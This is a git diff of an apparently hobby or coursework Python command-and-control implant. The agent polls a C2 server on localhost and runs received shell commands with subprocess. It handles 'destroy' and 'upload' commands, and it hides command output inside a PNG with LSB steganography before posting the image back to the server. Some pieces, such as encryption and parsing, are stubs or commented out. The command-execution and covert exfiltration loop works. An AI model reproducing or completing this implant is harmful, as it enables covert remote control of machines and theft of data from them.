@@ -1,12 +1,12 @@
-from flask import Flask, request, render_template
+from Crypto.Cipher import AES
+from stegano import lsb
+import uuid
 import requests
-import json 
 import subprocess
 import time
 
-#remember, the entire idea is that polling for tasks is done as a post, and you need to send a dummy get to poll 
 
-app = Flask(__name__)
+
 url = "http://localhost:80/"
 routes = {
     0 : url + "task", 
@@ -18,16 +18,48 @@ def encrypt(plain_str):
     pass
 
 #Decryption of data 
-def decrypt(plain_str): 
+def decrypt(msg, key): 
     pass 
+
+#str is the encrypted string of data that needs to be hidden in a file. 
+def mod_img(msg):
+    path = "./images/"
+    file_name = "safari-bird"
+    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
+    encoded_img.save(f"{path}{file_name}-final.png")
+    #Error Checking: 
+    #print("[*] Revealed from image:")
+    #print(lsb.reveal(f"{path}{file_name}-final.png"))
+    return f"{path}{file_name}-final.png" 
+
+"""
+def img_in_img(cover, path_to_img): 
+    cover_img = Image.open(cover)
+    cover_img.resize((50000, 1000))
+    with open(path_to_img, "rb") as img_file:
+        print(len(img_file.read())) 
+        altered_img = stepic.encode(cover_img, img_file.read())
+    print(type(altered_img))
+"""
+
 
 #Execute command 
 def exec(cmd): 
-    print("[+] Executing command: %s" % cmd)
-    cmd_lst = cmd.split()
-    output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
-    result = output.stdout 
-    print("[+] Result: %s" % cmd)
+    result = ""
+    if cmd == "sleep 10":
+        time.sleep(10)
+    else: 
+        cmd_lst = cmd.split()
+        if cmd_lst[0] == "destroy":
+            destroy()
+        elif cmd_lst[0] == "upload": 
+            print(f"[+] Reading {cmd_lst[1]}")
+            pass #needs to be implemented
+        else: 
+            print("[+] Executing command: %s" % cmd)
+            output = subprocess.run(cmd_lst, capture_output=True, text=True)
+            result = output.stdout 
+            print("[+] Result: %s" % result)
     return result 
 
 #Sending output back to C2Server 
@@ -56,32 +88,39 @@ def init():
     exit(1) #If reached, server cannot be contacted, and must exit
 
 #Gets task from GET request and executes 
-@app.route('/', methods=['GET'])
-def task():
-    cmd = request.get_json() 
-    #any decryption, de-obfuscation and string processing should go here 
-    result = exec(cmd)
-    #Encryption and obfuscation of data goes here 
-    send_output(result)
-    return render_template('tasks.html')
+
+def parse_json(response): 
+    res_json = response.json()
+    cmd = ""
+    if res_json["msg"] == None: 
+        print("[-] Error in parsing JSON.")
+        cmd = "echo 0" #just doing this to handle error case 
+    else:
+        cmd = res_json["msg"]
+    return cmd
 
 if __name__ == '__main__':
     init()
     while True: 
-        query = "some code"
         try: 
-            response = requests.post(routes[1], data=query)
-            #logic for extracting cmd goes here 
-            cmd = "ls -la"
-            exec(cmd)
+            #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
+            #response = requests.get(routes[0]) 
+            #encrypted_cmd = parse_json(response) 
+            #cmd = decrypt(encrypted_cmd) 
+            cmd = "ls -la" 
+            output = exec(cmd) 
+            if output != "": 
+                obf_img = mod_img(output)
+                requests.post(routes[1], files={"file": open(obf_img,'rb')})
         except Exception as e: 
+            print(e)
+            break
             """
             Options for handling query failure: 
                 - self destruct immediately 
                 - try 3 times, the exit if all fail
                 - sleep and try again, etc.
             """
-    app.run(host='0.0.0.0', port=8080)
     
 
 
